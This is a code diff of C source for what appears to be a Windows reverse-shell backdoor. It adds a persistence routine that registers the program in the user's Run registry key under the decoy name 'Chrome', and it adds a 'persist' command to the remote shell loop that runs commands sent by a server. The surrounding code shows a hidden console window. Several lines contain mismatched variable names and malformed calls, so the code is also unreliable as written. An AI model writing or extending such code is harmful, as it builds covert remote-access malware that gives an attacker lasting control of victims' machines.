@@ -13,6 +13,37 @@
 
 int sock;
 
+void RunOnBoot() {
+    char errorMessage[18] = "Persistence failed";
+    char successMessage[91] = "Created persistence at HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    TCHAR szPath[MAX_PATH];
+    DWORD pathLength = 0;
+
+    pathLength = GetModuleFileName(null, szPath, MAX_PATH);
+    if(pathLength == 0) {
+        //failed
+        send(sock, errorMessage, sizeof(error), 0);
+        return;
+    }
+
+    HKEY NewValue;
+    //open the registry and attempt to add value
+    if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
+        //failed
+        send(sock, errorMessage, sizeof(error), 0);
+        return;
+    }
+    DWORD pathLenthBytes = pathLength * sizeof(*szPath);
+    if(RegSetValueEx(NewValue, TEXT("Chrome"), REG_SZ, (LPBYTE) szPath, pathLengtBytes) != ERROR_SUCCESS) {
+        //failed
+        RegCloseKey(NewValue); //close the key
+        send(sock, errorMessage, sizeof(error), 0);
+        return;  
+    }
+    send(sock, successMessage, sizeof(successMessage));
+    RegCloseKey(NewValue); //close the key
+}
+
 void Shell() {
     char buffer[1024];
     char container[1024];
@@ -30,9 +61,11 @@ void Shell() {
         if(strncmp("q", buffer, 1) == 0) { //string compare(a, b, number of chars)
             break;
         } else if (strncmp("cd ", buffer, 3) == 0) {
-            char *temp = buffer + 3;
+            char *temp = buffer + 3; //shifts buffer over 3 chars
             chdir(temp); //changes program dir
-            strcat(totalResponse, temp);
+            strcat(totalResponse, temp); //sends the dir back to the server
+        } else if (strncmp("persist", buffer, 7) == 0) {
+            RunOnBoot();    
         } else {
             //execute command
             FILE *file; //file is basically just used as a string stream
@@ -55,6 +88,7 @@ void Shell() {
     exit(0);
 }
 
+//Main method
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
     HWND stealth; //window handle
     AllocConsole(); //creates a console
